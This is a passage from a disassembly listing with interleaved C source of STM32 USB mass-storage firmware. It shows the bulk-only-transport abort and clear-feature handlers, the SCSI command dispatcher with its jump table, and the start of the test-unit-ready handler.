 80096a8:	2000010a 	.word	0x2000010a
 80096ac:	2000010b 	.word	0x2000010b

080096b0 <MSC_BOT_Abort>:
  * @param  pdev: device instance
  * @retval status
  */

static void  MSC_BOT_Abort(USBD_HandleTypeDef *pdev)
{
 80096b0:	b580      	push	{r7, lr}
 80096b2:	b084      	sub	sp, #16
 80096b4:	af00      	add	r7, sp, #0
 80096b6:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80096b8:	687b      	ldr	r3, [r7, #4]
 80096ba:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80096be:	687b      	ldr	r3, [r7, #4]
 80096c0:	32b0      	adds	r2, #176	; 0xb0
 80096c2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80096c6:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80096c8:	68fb      	ldr	r3, [r7, #12]
 80096ca:	2b00      	cmp	r3, #0
 80096cc:	d02c      	beq.n	8009728 <MSC_BOT_Abort+0x78>
  {
    return;
  }

  if ((hmsc->cbw.bmFlags == 0U) &&
 80096ce:	68fb      	ldr	r3, [r7, #12]
 80096d0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096d4:	7f1b      	ldrb	r3, [r3, #28]
 80096d6:	2b00      	cmp	r3, #0
 80096d8:	d10f      	bne.n	80096fa <MSC_BOT_Abort+0x4a>
      (hmsc->cbw.dDataLength != 0U) &&
 80096da:	68fb      	ldr	r3, [r7, #12]
 80096dc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096e0:	699b      	ldr	r3, [r3, #24]
  if ((hmsc->cbw.bmFlags == 0U) &&
 80096e2:	2b00      	cmp	r3, #0
 80096e4:	d009      	beq.n	80096fa <MSC_BOT_Abort+0x4a>
      (hmsc->bot_status == USBD_BOT_STATUS_NORMAL))
 80096e6:	68fb      	ldr	r3, [r7, #12]
 80096e8:	7a5b      	ldrb	r3, [r3, #9]
      (hmsc->cbw.dDataLength != 0U) &&
 80096ea:	2b00      	cmp	r3, #0
 80096ec:	d105      	bne.n	80096fa <MSC_BOT_Abort+0x4a>
  {
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 80096ee:	4b10      	ldr	r3, [pc, #64]	; (8009730 <MSC_BOT_Abort+0x80>)
 80096f0:	781b      	ldrb	r3, [r3, #0]
 80096f2:	4619      	mov	r1, r3
 80096f4:	6878      	ldr	r0, [r7, #4]
 80096f6:	f003 faa7 	bl	800cc48 <USBD_LL_StallEP>
  }

  (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 80096fa:	4b0e      	ldr	r3, [pc, #56]	; (8009734 <MSC_BOT_Abort+0x84>)
 80096fc:	781b      	ldrb	r3, [r3, #0]
 80096fe:	4619      	mov	r1, r3
 8009700:	6878      	ldr	r0, [r7, #4]
 8009702:	f003 faa1 	bl	800cc48 <USBD_LL_StallEP>

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR)
 8009706:	68fb      	ldr	r3, [r7, #12]
 8009708:	7a5b      	ldrb	r3, [r3, #9]
 800970a:	2b02      	cmp	r3, #2
 800970c:	d10d      	bne.n	800972a <MSC_BOT_Abort+0x7a>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 800970e:	4b09      	ldr	r3, [pc, #36]	; (8009734 <MSC_BOT_Abort+0x84>)
 8009710:	781b      	ldrb	r3, [r3, #0]
 8009712:	4619      	mov	r1, r3
 8009714:	6878      	ldr	r0, [r7, #4]
 8009716:	f003 fa97 	bl	800cc48 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800971a:	4b05      	ldr	r3, [pc, #20]	; (8009730 <MSC_BOT_Abort+0x80>)
 800971c:	781b      	ldrb	r3, [r3, #0]
 800971e:	4619      	mov	r1, r3
 8009720:	6878      	ldr	r0, [r7, #4]
 8009722:	f003 fa91 	bl	800cc48 <USBD_LL_StallEP>
 8009726:	e000      	b.n	800972a <MSC_BOT_Abort+0x7a>
    return;
 8009728:	bf00      	nop
  }
}
 800972a:	3710      	adds	r7, #16
 800972c:	46bd      	mov	sp, r7
 800972e:	bd80      	pop	{r7, pc}
 8009730:	2000010b 	.word	0x2000010b
 8009734:	2000010a 	.word	0x2000010a

08009738 <MSC_BOT_CplClrFeature>:
  * @param  epnum: endpoint index
  * @retval None
  */

void  MSC_BOT_CplClrFeature(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009738:	b580      	push	{r7, lr}
 800973a:	b084      	sub	sp, #16
 800973c:	af00      	add	r7, sp, #0
 800973e:	6078      	str	r0, [r7, #4]
 8009740:	460b      	mov	r3, r1
 8009742:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009744:	687b      	ldr	r3, [r7, #4]
 8009746:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800974a:	687b      	ldr	r3, [r7, #4]
 800974c:	32b0      	adds	r2, #176	; 0xb0
 800974e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009752:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009754:	68fb      	ldr	r3, [r7, #12]
 8009756:	2b00      	cmp	r3, #0
 8009758:	d01d      	beq.n	8009796 <MSC_BOT_CplClrFeature+0x5e>
  {
    return;
  }

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR) /* Bad CBW Signature */
 800975a:	68fb      	ldr	r3, [r7, #12]
 800975c:	7a5b      	ldrb	r3, [r3, #9]
 800975e:	2b02      	cmp	r3, #2
 8009760:	d10c      	bne.n	800977c <MSC_BOT_CplClrFeature+0x44>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 8009762:	4b10      	ldr	r3, [pc, #64]	; (80097a4 <MSC_BOT_CplClrFeature+0x6c>)
 8009764:	781b      	ldrb	r3, [r3, #0]
 8009766:	4619      	mov	r1, r3
 8009768:	6878      	ldr	r0, [r7, #4]
 800976a:	f003 fa6d 	bl	800cc48 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800976e:	4b0e      	ldr	r3, [pc, #56]	; (80097a8 <MSC_BOT_CplClrFeature+0x70>)
 8009770:	781b      	ldrb	r3, [r3, #0]
 8009772:	4619      	mov	r1, r3
 8009774:	6878      	ldr	r0, [r7, #4]
 8009776:	f003 fa67 	bl	800cc48 <USBD_LL_StallEP>
 800977a:	e00f      	b.n	800979c <MSC_BOT_CplClrFeature+0x64>
  }
  else if (((epnum & 0x80U) == 0x80U) && (hmsc->bot_status != USBD_BOT_STATUS_RECOVERY))
 800977c:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8009780:	2b00      	cmp	r3, #0
 8009782:	da0a      	bge.n	800979a <MSC_BOT_CplClrFeature+0x62>
 8009784:	68fb      	ldr	r3, [r7, #12]
 8009786:	7a5b      	ldrb	r3, [r3, #9]
 8009788:	2b01      	cmp	r3, #1
 800978a:	d006      	beq.n	800979a <MSC_BOT_CplClrFeature+0x62>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 800978c:	2101      	movs	r1, #1
 800978e:	6878      	ldr	r0, [r7, #4]
 8009790:	f7ff ff4e 	bl	8009630 <MSC_BOT_SendCSW>
 8009794:	e002      	b.n	800979c <MSC_BOT_CplClrFeature+0x64>
    return;
 8009796:	bf00      	nop
 8009798:	e000      	b.n	800979c <MSC_BOT_CplClrFeature+0x64>
  }
  else
  {
    return;
 800979a:	bf00      	nop
  }
}
 800979c:	3710      	adds	r7, #16
 800979e:	46bd      	mov	sp, r7
 80097a0:	bd80      	pop	{r7, pc}
 80097a2:	bf00      	nop
 80097a4:	2000010a 	.word	0x2000010a
 80097a8:	2000010b 	.word	0x2000010b

080097ac <SCSI_ProcessCmd>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
int8_t SCSI_ProcessCmd(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *cmd)
{
 80097ac:	b580      	push	{r7, lr}
 80097ae:	b086      	sub	sp, #24
 80097b0:	af00      	add	r7, sp, #0
 80097b2:	60f8      	str	r0, [r7, #12]
 80097b4:	460b      	mov	r3, r1
 80097b6:	607a      	str	r2, [r7, #4]
 80097b8:	72fb      	strb	r3, [r7, #11]
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80097ba:	68fb      	ldr	r3, [r7, #12]
 80097bc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80097c0:	68fb      	ldr	r3, [r7, #12]
 80097c2:	32b0      	adds	r2, #176	; 0xb0
 80097c4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80097c8:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 80097ca:	693b      	ldr	r3, [r7, #16]
 80097cc:	2b00      	cmp	r3, #0
 80097ce:	d102      	bne.n	80097d6 <SCSI_ProcessCmd+0x2a>
  {
    return -1;
 80097d0:	f04f 33ff 	mov.w	r3, #4294967295
 80097d4:	e168      	b.n	8009aa8 <SCSI_ProcessCmd+0x2fc>
  }

  switch (cmd[0])
 80097d6:	687b      	ldr	r3, [r7, #4]
 80097d8:	781b      	ldrb	r3, [r3, #0]
 80097da:	2baa      	cmp	r3, #170	; 0xaa
 80097dc:	f000 8144 	beq.w	8009a68 <SCSI_ProcessCmd+0x2bc>
 80097e0:	2baa      	cmp	r3, #170	; 0xaa
 80097e2:	f300 8153 	bgt.w	8009a8c <SCSI_ProcessCmd+0x2e0>
 80097e6:	2ba8      	cmp	r3, #168	; 0xa8
 80097e8:	f000 812c 	beq.w	8009a44 <SCSI_ProcessCmd+0x298>
 80097ec:	2ba8      	cmp	r3, #168	; 0xa8
 80097ee:	f300 814d 	bgt.w	8009a8c <SCSI_ProcessCmd+0x2e0>
 80097f2:	2b5a      	cmp	r3, #90	; 0x5a
 80097f4:	f300 80c0 	bgt.w	8009978 <SCSI_ProcessCmd+0x1cc>
 80097f8:	2b00      	cmp	r3, #0
 80097fa:	f2c0 8147 	blt.w	8009a8c <SCSI_ProcessCmd+0x2e0>
 80097fe:	2b5a      	cmp	r3, #90	; 0x5a
 8009800:	f200 8144 	bhi.w	8009a8c <SCSI_ProcessCmd+0x2e0>
 8009804:	a201      	add	r2, pc, #4	; (adr r2, 800980c <SCSI_ProcessCmd+0x60>)
 8009806:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800980a:	bf00      	nop
 800980c:	0800997f 	.word	0x0800997f
 8009810:	08009a8d 	.word	0x08009a8d
 8009814:	08009a8d 	.word	0x08009a8d
 8009818:	08009991 	.word	0x08009991
 800981c:	08009a8d 	.word	0x08009a8d
 8009820:	08009a8d 	.word	0x08009a8d
 8009824:	08009a8d 	.word	0x08009a8d
 8009828:	08009a8d 	.word	0x08009a8d
 800982c:	08009a8d 	.word	0x08009a8d
 8009830:	08009a8d 	.word	0x08009a8d
 8009834:	08009a8d 	.word	0x08009a8d
 8009838:	08009a8d 	.word	0x08009a8d
 800983c:	08009a8d 	.word	0x08009a8d
 8009840:	08009a8d 	.word	0x08009a8d
 8009844:	08009a8d 	.word	0x08009a8d
 8009848:	08009a8d 	.word	0x08009a8d
 800984c:	08009a8d 	.word	0x08009a8d
 8009850:	08009a8d 	.word	0x08009a8d
 8009854:	080099a3 	.word	0x080099a3
 8009858:	08009a8d 	.word	0x08009a8d
 800985c:	08009a8d 	.word	0x08009a8d
 8009860:	08009a8d 	.word	0x08009a8d
 8009864:	08009a8d 	.word	0x08009a8d
 8009868:	08009a8d 	.word	0x08009a8d
 800986c:	08009a8d 	.word	0x08009a8d
 8009870:	08009a8d 	.word	0x08009a8d
 8009874:	080099d9 	.word	0x080099d9
 8009878:	080099b5 	.word	0x080099b5
 800987c:	08009a8d 	.word	0x08009a8d
 8009880:	08009a8d 	.word	0x08009a8d
 8009884:	080099c7 	.word	0x080099c7
 8009888:	08009a8d 	.word	0x08009a8d
 800988c:	08009a8d 	.word	0x08009a8d
 8009890:	08009a8d 	.word	0x08009a8d
 8009894:	08009a8d 	.word	0x08009a8d
 8009898:	080099fd 	.word	0x080099fd
 800989c:	08009a8d 	.word	0x08009a8d
 80098a0:	08009a0f 	.word	0x08009a0f
 80098a4:	08009a8d 	.word	0x08009a8d
 80098a8:	08009a8d 	.word	0x08009a8d
 80098ac:	08009a33 	.word	0x08009a33
 80098b0:	08009a8d 	.word	0x08009a8d
 80098b4:	08009a57 	.word	0x08009a57
 80098b8:	08009a8d 	.word	0x08009a8d
 80098bc:	08009a8d 	.word	0x08009a8d
 80098c0:	08009a8d 	.word	0x08009a8d
 80098c4:	08009a8d 	.word	0x08009a8d
 80098c8:	08009a7b 	.word	0x08009a7b
 80098cc:	08009a8d 	.word	0x08009a8d
 80098d0:	08009a8d 	.word	0x08009a8d
 80098d4:	08009a8d 	.word	0x08009a8d
 80098d8:	08009a8d 	.word	0x08009a8d
 80098dc:	08009a8d 	.word	0x08009a8d
 80098e0:	08009a8d 	.word	0x08009a8d
 80098e4:	08009a8d 	.word	0x08009a8d
 80098e8:	08009a8d 	.word	0x08009a8d
 80098ec:	08009a8d 	.word	0x08009a8d
 80098f0:	08009a8d 	.word	0x08009a8d
 80098f4:	08009a8d 	.word	0x08009a8d
 80098f8:	08009a8d 	.word	0x08009a8d
 80098fc:	08009a8d 	.word	0x08009a8d
 8009900:	08009a8d 	.word	0x08009a8d
 8009904:	08009a8d 	.word	0x08009a8d
 8009908:	08009a8d 	.word	0x08009a8d
 800990c:	08009a8d 	.word	0x08009a8d
 8009910:	08009a8d 	.word	0x08009a8d
 8009914:	08009a8d 	.word	0x08009a8d
 8009918:	08009a8d 	.word	0x08009a8d
 800991c:	08009a8d 	.word	0x08009a8d
 8009920:	08009a8d 	.word	0x08009a8d
 8009924:	08009a8d 	.word	0x08009a8d
 8009928:	08009a8d 	.word	0x08009a8d
 800992c:	08009a8d 	.word	0x08009a8d
 8009930:	08009a8d 	.word	0x08009a8d
 8009934:	08009a8d 	.word	0x08009a8d
 8009938:	08009a8d 	.word	0x08009a8d
 800993c:	08009a8d 	.word	0x08009a8d
 8009940:	08009a8d 	.word	0x08009a8d
 8009944:	08009a8d 	.word	0x08009a8d
 8009948:	08009a8d 	.word	0x08009a8d
 800994c:	08009a8d 	.word	0x08009a8d
 8009950:	08009a8d 	.word	0x08009a8d
 8009954:	08009a8d 	.word	0x08009a8d
 8009958:	08009a8d 	.word	0x08009a8d
 800995c:	08009a8d 	.word	0x08009a8d
 8009960:	08009a8d 	.word	0x08009a8d
 8009964:	08009a8d 	.word	0x08009a8d
 8009968:	08009a8d 	.word	0x08009a8d
 800996c:	08009a8d 	.word	0x08009a8d
 8009970:	08009a8d 	.word	0x08009a8d
 8009974:	080099eb 	.word	0x080099eb
 8009978:	2b9e      	cmp	r3, #158	; 0x9e
 800997a:	d051      	beq.n	8009a20 <SCSI_ProcessCmd+0x274>
 800997c:	e086      	b.n	8009a8c <SCSI_ProcessCmd+0x2e0>
  {
    case SCSI_TEST_UNIT_READY:
      ret = SCSI_TestUnitReady(pdev, lun, cmd);
 800997e:	7afb      	ldrb	r3, [r7, #11]
 8009980:	687a      	ldr	r2, [r7, #4]
 8009982:	4619      	mov	r1, r3
 8009984:	68f8      	ldr	r0, [r7, #12]
 8009986:	f000 f893 	bl	8009ab0 <SCSI_TestUnitReady>
 800998a:	4603      	mov	r3, r0
 800998c:	75fb      	strb	r3, [r7, #23]
      break;
 800998e:	e089      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_REQUEST_SENSE:
      ret = SCSI_RequestSense(pdev, lun, cmd);
 8009990:	7afb      	ldrb	r3, [r7, #11]
 8009992:	687a      	ldr	r2, [r7, #4]
 8009994:	4619      	mov	r1, r3
 8009996:	68f8      	ldr	r0, [r7, #12]
 8009998:	f000 fb9a 	bl	800a0d0 <SCSI_RequestSense>
 800999c:	4603      	mov	r3, r0
 800999e:	75fb      	strb	r3, [r7, #23]
      break;
 80099a0:	e080      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_INQUIRY:
      ret = SCSI_Inquiry(pdev, lun, cmd);
 80099a2:	7afb      	ldrb	r3, [r7, #11]
 80099a4:	687a      	ldr	r2, [r7, #4]
 80099a6:	4619      	mov	r1, r3
 80099a8:	68f8      	ldr	r0, [r7, #12]
 80099aa:	f000 f8df 	bl	8009b6c <SCSI_Inquiry>
 80099ae:	4603      	mov	r3, r0
 80099b0:	75fb      	strb	r3, [r7, #23]
      break;
 80099b2:	e077      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_START_STOP_UNIT:
      ret = SCSI_StartStopUnit(pdev, lun, cmd);
 80099b4:	7afb      	ldrb	r3, [r7, #11]
 80099b6:	687a      	ldr	r2, [r7, #4]
 80099b8:	4619      	mov	r1, r3
 80099ba:	68f8      	ldr	r0, [r7, #12]
 80099bc:	f000 fc7e 	bl	800a2bc <SCSI_StartStopUnit>
 80099c0:	4603      	mov	r3, r0
 80099c2:	75fb      	strb	r3, [r7, #23]
      break;
 80099c4:	e06e      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_ALLOW_MEDIUM_REMOVAL:
      ret = SCSI_AllowPreventRemovable(pdev, lun, cmd);
 80099c6:	7afb      	ldrb	r3, [r7, #11]
 80099c8:	687a      	ldr	r2, [r7, #4]
 80099ca:	4619      	mov	r1, r3
 80099cc:	68f8      	ldr	r0, [r7, #12]
 80099ce:	f000 fcd2 	bl	800a376 <SCSI_AllowPreventRemovable>
 80099d2:	4603      	mov	r3, r0
 80099d4:	75fb      	strb	r3, [r7, #23]
      break;
 80099d6:	e065      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE6:
      ret = SCSI_ModeSense6(pdev, lun, cmd);
 80099d8:	7afb      	ldrb	r3, [r7, #11]
 80099da:	687a      	ldr	r2, [r7, #4]
 80099dc:	4619      	mov	r1, r3
 80099de:	68f8      	ldr	r0, [r7, #12]
 80099e0:	f000 fb16 	bl	800a010 <SCSI_ModeSense6>
 80099e4:	4603      	mov	r3, r0
 80099e6:	75fb      	strb	r3, [r7, #23]
      break;
 80099e8:	e05c      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE10:
      ret = SCSI_ModeSense10(pdev, lun, cmd);
 80099ea:	7afb      	ldrb	r3, [r7, #11]
 80099ec:	687a      	ldr	r2, [r7, #4]
 80099ee:	4619      	mov	r1, r3
 80099f0:	68f8      	ldr	r0, [r7, #12]
 80099f2:	f000 fb3d 	bl	800a070 <SCSI_ModeSense10>
 80099f6:	4603      	mov	r3, r0
 80099f8:	75fb      	strb	r3, [r7, #23]
      break;
 80099fa:	e053      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_FORMAT_CAPACITIES:
      ret = SCSI_ReadFormatCapacity(pdev, lun, cmd);
 80099fc:	7afb      	ldrb	r3, [r7, #11]
 80099fe:	687a      	ldr	r2, [r7, #4]
 8009a00:	4619      	mov	r1, r3
 8009a02:	68f8      	ldr	r0, [r7, #12]
 8009a04:	f000 fa86 	bl	8009f14 <SCSI_ReadFormatCapacity>
 8009a08:	4603      	mov	r3, r0
 8009a0a:	75fb      	strb	r3, [r7, #23]
      break;
 8009a0c:	e04a      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY10:
      ret = SCSI_ReadCapacity10(pdev, lun, cmd);
 8009a0e:	7afb      	ldrb	r3, [r7, #11]
 8009a10:	687a      	ldr	r2, [r7, #4]
 8009a12:	4619      	mov	r1, r3
 8009a14:	68f8      	ldr	r0, [r7, #12]
 8009a16:	f000 f929 	bl	8009c6c <SCSI_ReadCapacity10>
 8009a1a:	4603      	mov	r3, r0
 8009a1c:	75fb      	strb	r3, [r7, #23]
      break;
 8009a1e:	e041      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY16:
      ret = SCSI_ReadCapacity16(pdev, lun, cmd);
 8009a20:	7afb      	ldrb	r3, [r7, #11]
 8009a22:	687a      	ldr	r2, [r7, #4]
 8009a24:	4619      	mov	r1, r3
 8009a26:	68f8      	ldr	r0, [r7, #12]
 8009a28:	f000 f9af 	bl	8009d8a <SCSI_ReadCapacity16>
 8009a2c:	4603      	mov	r3, r0
 8009a2e:	75fb      	strb	r3, [r7, #23]
      break;
 8009a30:	e038      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ10:
      ret = SCSI_Read10(pdev, lun, cmd);
 8009a32:	7afb      	ldrb	r3, [r7, #11]
 8009a34:	687a      	ldr	r2, [r7, #4]
 8009a36:	4619      	mov	r1, r3
 8009a38:	68f8      	ldr	r0, [r7, #12]
 8009a3a:	f000 fccd 	bl	800a3d8 <SCSI_Read10>
 8009a3e:	4603      	mov	r3, r0
 8009a40:	75fb      	strb	r3, [r7, #23]
      break;
 8009a42:	e02f      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ12:
      ret = SCSI_Read12(pdev, lun, cmd);
 8009a44:	7afb      	ldrb	r3, [r7, #11]
 8009a46:	687a      	ldr	r2, [r7, #4]
 8009a48:	4619      	mov	r1, r3
 8009a4a:	68f8      	ldr	r0, [r7, #12]
 8009a4c:	f000 fd7b 	bl	800a546 <SCSI_Read12>
 8009a50:	4603      	mov	r3, r0
 8009a52:	75fb      	strb	r3, [r7, #23]
      break;
 8009a54:	e026      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE10:
      ret = SCSI_Write10(pdev, lun, cmd);
 8009a56:	7afb      	ldrb	r3, [r7, #11]
 8009a58:	687a      	ldr	r2, [r7, #4]
 8009a5a:	4619      	mov	r1, r3
 8009a5c:	68f8      	ldr	r0, [r7, #12]
 8009a5e:	f000 fe33 	bl	800a6c8 <SCSI_Write10>
 8009a62:	4603      	mov	r3, r0
 8009a64:	75fb      	strb	r3, [r7, #23]
      break;
 8009a66:	e01d      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE12:
      ret = SCSI_Write12(pdev, lun, cmd);
 8009a68:	7afb      	ldrb	r3, [r7, #11]
 8009a6a:	687a      	ldr	r2, [r7, #4]
 8009a6c:	4619      	mov	r1, r3
 8009a6e:	68f8      	ldr	r0, [r7, #12]
 8009a70:	f000 ff0e 	bl	800a890 <SCSI_Write12>
 8009a74:	4603      	mov	r3, r0
 8009a76:	75fb      	strb	r3, [r7, #23]
      break;
 8009a78:	e014      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_VERIFY10:
      ret = SCSI_Verify10(pdev, lun, cmd);
 8009a7a:	7afb      	ldrb	r3, [r7, #11]
 8009a7c:	687a      	ldr	r2, [r7, #4]
 8009a7e:	4619      	mov	r1, r3
 8009a80:	68f8      	ldr	r0, [r7, #12]
 8009a82:	f000 fff9 	bl	800aa78 <SCSI_Verify10>
 8009a86:	4603      	mov	r3, r0
 8009a88:	75fb      	strb	r3, [r7, #23]
      break;
 8009a8a:	e00b      	b.n	8009aa4 <SCSI_ProcessCmd+0x2f8>

    default:
      SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_CDB);
 8009a8c:	7af9      	ldrb	r1, [r7, #11]
 8009a8e:	2320      	movs	r3, #32
 8009a90:	2205      	movs	r2, #5
 8009a92:	68f8      	ldr	r0, [r7, #12]
 8009a94:	f000 fbb6 	bl	800a204 <SCSI_SenseCode>
      hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009a98:	693b      	ldr	r3, [r7, #16]
 8009a9a:	2202      	movs	r2, #2
 8009a9c:	725a      	strb	r2, [r3, #9]
      ret = -1;
 8009a9e:	23ff      	movs	r3, #255	; 0xff
 8009aa0:	75fb      	strb	r3, [r7, #23]
      break;
 8009aa2:	bf00      	nop
  }

  return ret;
 8009aa4:	f997 3017 	ldrsb.w	r3, [r7, #23]
}
 8009aa8:	4618      	mov	r0, r3
 8009aaa:	3718      	adds	r7, #24
 8009aac:	46bd      	mov	sp, r7
 8009aae:	bd80      	pop	{r7, pc}

08009ab0 <SCSI_TestUnitReady>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_TestUnitReady(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009ab0:	b580      	push	{r7, lr}
 8009ab2:	b086      	sub	sp, #24
 8009ab4:	af00      	add	r7, sp, #0
 8009ab6:	60f8      	str	r0, [r7, #12]
 8009ab8:	460b      	mov	r3, r1
 8009aba:	607a      	str	r2, [r7, #4]
 8009abc:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009abe:	68fb      	ldr	r3, [r7, #12]
 8009ac0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009ac4:	68fb      	ldr	r3, [r7, #12]
 8009ac6:	32b0      	adds	r2, #176	; 0xb0
 8009ac8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009acc:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009ace:	697b      	ldr	r3, [r7, #20]
 8009ad0:	2b00      	cmp	r3, #0
 8009ad2:	d102      	bne.n	8009ada <SCSI_TestUnitReady+0x2a>
  {
    return -1;
 8009ad4:	f04f 33ff 	mov.w	r3, #4294967295
 8009ad8:	e043      	b.n	8009b62 <SCSI_TestUnitReady+0xb2>
  }

  /* case 9 : Hi > D0 */
  if (hmsc->cbw.dDataLength != 0U)
 8009ada:	697b      	ldr	r3, [r7, #20]
 8009adc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ae0:	699b      	ldr	r3, [r3, #24]
 8009ae2:	2b00      	cmp	r3, #0
 8009ae4:	d00b      	beq.n	8009afe <SCSI_TestUnitReady+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009ae6:	697b      	ldr	r3, [r7, #20]
 8009ae8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009aec:	7f59      	ldrb	r1, [r3, #29]
 8009aee:	2320      	movs	r3, #32
 8009af0:	2205      	movs	r2, #5
 8009af2:	68f8      	ldr	r0, [r7, #12]
 8009af4:	f000 fb86 	bl	800a204 <SCSI_SenseCode>

    return -1;
 8009af8:	f04f 33ff 	mov.w	r3, #4294967295
 8009afc:	e031      	b.n	8009b62 <SCSI_TestUnitReady+0xb2>
  }

  if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 8009afe:	697b      	ldr	r3, [r7, #20]
 8009b00:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b04:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009b08:	2b02      	cmp	r3, #2
 8009b0a:	d10b      	bne.n	8009b24 <SCSI_TestUnitReady+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009b0c:	7af9      	ldrb	r1, [r7, #11]
 8009b0e:	233a      	movs	r3, #58	; 0x3a
 8009b10:	2202      	movs	r2, #2
 8009b12:	68f8      	ldr	r0, [r7, #12]
 8009b14:	f000 fb76 	bl	800a204 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009b18:	697b      	ldr	r3, [r7, #20]
 8009b1a:	2205      	movs	r2, #5
 8009b1c:	721a      	strb	r2, [r3, #8]
    return -1;
 8009b1e:	f04f 33ff 	mov.w	r3, #4294967295
 8009b22:	e01e      	b.n	8009b62 <SCSI_TestUnitReady+0xb2>
  }

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 8009b24:	68fb      	ldr	r3, [r7, #12]
 8009b26:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009b2a:	68fa      	ldr	r2, [r7, #12]
 8009b2c:	33b0      	adds	r3, #176	; 0xb0
 8009b2e:	009b      	lsls	r3, r3, #2
 8009b30:	4413      	add	r3, r2
 8009b32:	685b      	ldr	r3, [r3, #4]
 8009b34:	689b      	ldr	r3, [r3, #8]
 8009b36:	7afa      	ldrb	r2, [r7, #11]
 8009b38:	4610      	mov	r0, r2
 8009b3a:	4798      	blx	r3
 8009b3c:	4603      	mov	r3, r0
 8009b3e:	2b00      	cmp	r3, #0
 8009b40:	d00b      	beq.n	8009b5a <SCSI_TestUnitReady+0xaa>
